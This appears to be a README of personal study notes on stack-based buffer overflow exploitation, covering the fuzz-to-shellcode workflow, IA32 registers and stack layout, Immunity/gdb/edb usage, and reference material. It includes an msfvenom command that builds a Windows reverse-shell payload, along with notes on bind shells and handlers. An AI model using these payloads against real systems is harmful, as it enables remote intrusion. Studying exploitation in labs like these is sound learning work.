# A Study in Overflows
This is a repo of data and scripts that could be useful when learning about and testing for buffer overflows.

README is a mix of notes from study material, books, courses, etc - see below for incomplete list of reference material.

## Common Stack-based Buffer Overflow Workflow
1. Fuzz, observe crash and confirm the rough number of bytes to crash
2. Determine the Offset for EIP with pattern_create.rb -l ... & pattern_offset.rb -q ...
3. Confirm control of EIP
4. Determine the Attack Vector: Examine Registers for a place to inject shellcode
*  ..Remove Bad Characters...
*  ..Redirect Execution Flow: nasm_shell.rb helps with this
*  ..confirm jmp esp exectures correctly
7. Add Shellcode...magic happens

## Research

### Code Injection Using Buffer Overflow Challenges:
**Challenge 1 - Loading Code into Memory**
* Note that a bugger of size 5, can only take 4 characters, due to the \0 null-byte at the end.
* Code must be the machine code instructions that that machine is prepared to run...not C source code, but Assembly Language [ cannot contain zero-bytes ]
* What Code to Run?  Goal is a general purpose shell code, with CL/Terminal prompt that gives attacker access

**Challenge 2 - Getting Injected Code to Run**
* How do we control the %eip Instruction Pointer, and where is our code?...jump back to the RETURN ADDRESS by HIJACKING THE SAVED %eip

**Challenge 3 - Finding the Return Address**
* padding
* guess if not randomized, using trial & error or fuzzing
* nop ("no op") Sled:  A nop is a single-byte instruction that just moves to the next instruction.  If the adversary sticks a bunch of nops as padding, prior to his own code, then jumping anywhere in that nop sled will work.  Now we can improve our chances by a factor of a number of nops.

### Modern Buffer overflow protections:
* DEP:  Data Execution Prevention
* ASLR:  Address Space Layout Randomization

### Memory (Intel Based CPU)
| Low Memory | | |
| -------- | ----------- | ------- |
| | Text (Program) | |
| | Data (Global) | |
| | Heap (Dynamic Variables) | Grows Towards Stack |
| | Unused Memory | |
| | Stack (Fixed - Functions, Aruguments & Local Variables) | Grows Towards Heap |
| | Kernel | |
| High Memory | | |

### Registers are manipulated via Assembly language and is specific to the processor - Intel 32-bit = IA32 processor
IA32 Register Categories:
* General purpose (32-bit):  Mathematical operations
* Segment (16-bit):  Keep track of segments and allow backward compatability
* Control (32-bit):  Control the function of the processor
* Other (32-bit):  Extraneous registers

### General Purpose Registers (Linux x86 ( 32-bit / IA32 )...Ch1 in Shellcoders Handbook 
*NOTE:  "E" is for "extended" from 16-bit to 32-bit*

| Register | Description | More... |
| -------- | ----------- | ------- |
| **EIP** | **Instruction Pointer** | What we want to control |
| **ESP** | **Stack Pointer** | Points to memory address of the next stack operation |
| **EBP** | **Base Pointer ( Frame Pointer )** | ... |
| ESI | Source Index | ... |
| EDI | Destination Index | ... |
| **EAX** | **Accumulator** | should point to beginning of buffer |
| EBX | Base | ... |
| ECX | Counter | ... |
| EDX | Data | ... |

### Stack...
* grows from high to low memory ( 4GB [ 0xffffffff ] is the hightest to 0GB [ 0x00000000 ] at the lowest )
* LIFO
* PUSH & POP ( unwound ) instructions

### Stack Frame
| ... 		| loc1 | loc2 | %ebp | %eip | Arg1 | arg2 | Caller's Data |
| Low Memory | Stack | - | - | - | - | Frame | High Memory |

### Investigate
* Debuggers: Immunity, OllyDbg, x64gdb, gdb, Evans debugger, etc.
* ...

## Debuggers

### Immunity Debugger
* Attach and Play/release
* Easy right-click menu options: Breakpoint, 
* Corlan's !mona:
* ...!mona modules 
* ...!mona find -s "" -m moduleName.dll
* ...!mona pattern_create xxxx

### gdb allows...
* Start your program, specifying anything that might affect its behavior.
* Make your program stop on specified conditions.
* Examine what has happened, when your program has stopped.
* Change things in your program, so you can experiment with correcting the effects of one bug and go on to learn about another.
* Usage ( see also https://sourceware.org/gdb/wiki/Internals ):
* ...gdb <program name>
* ...list 1,45 (this shows lines 1-45 of the source code)
* ...break <line number>
* ...run <program input>
* ...Examine:  x
* ...x/16xw $esp ( examines 16 four-byte words in exadeciamal format, starting with ESP; ESP is stack pointer and marks the lowest memory address in the stack )
* ...x/xw $ebp
* ...continue
* ...disass/disassemble <function name>

### Evans Debugger (edb)
* Similar to Immunity
* Plugin > OpCode Searcher

### OpCodes
* http://www.jegerlehner.ch/intel/opcode.html
* https://www.hobbyprojects.com/8051_tutorial/jnb_jump_if_bit_not_set.html
* http://www.jegerlehner.ch/intel/opcode.html

### msfvenom
* Be sure "Payload size" of shellcode does not exceed expectations
* Take into account encode/decode with noop sleds/slide  before shellcode(8-16)..."\x90" * 16 
* If application is threaded, use EXITFUNC=thread to not crash the app and repeadedly exploit
* Non-staged payload x/shell_reverse_tcp vs staged: x/shell/reverse_tcp...nc can't handle these
* also consider multi/handler as the second stage
* The shell_bind_tcp will listen on that machine over the designated port, connect with something like nc -nv IPaddress port
* Windows Example:  msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... --format c --arch x86 EXITFUNC=thread --platform windows --bad-chars "\x00\x0a\x0d" --encoder x86/shikata_ga_nai


## Resources ( incomplete ):
* Coursera: University of Maryland, College Park - Software Security (Course 2 in Cybersecurity Specialization)
* Weidman, G. (2014). Penetration Testing. San Francisco, California. No Starch Press Inc.
* https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
* Bowne, S. (2019). CNIT 127: Exploit Development. samsclass.info
* Anley, C., Heasman, J., Linder, F., Richarte, G. (2007). The Shellcoder's Handbook: Discovering and Exploiting Security Holes. indianapolis, indiana. Wiley Publishing, Inc.
* https://en.wikipedia.org/wiki/Shellcode
* SLmail...https://www.youtube.com/watch?v=OOkU7to0Ty4 && https://github.com/jessekurrus
* Vulnserver...https://www.youtube.com/watch?v=qjWs___hQcE - Jesse Kurrus
* https://null-byte.wonderhowto.com/how-to/hack-like-pro-build-your-own-exploits-part-3-fuzzing-with-spike-find-overflows-0162789/
* https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap
* ...need to investigate this:  https://cs.lmu.edu/~ray/notes/nasmtutorial/
* https://www.cs.umd.edu/~srhuang/teaching/cmsc212/gdb-tutorial-handout.pdf
* http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
* ...
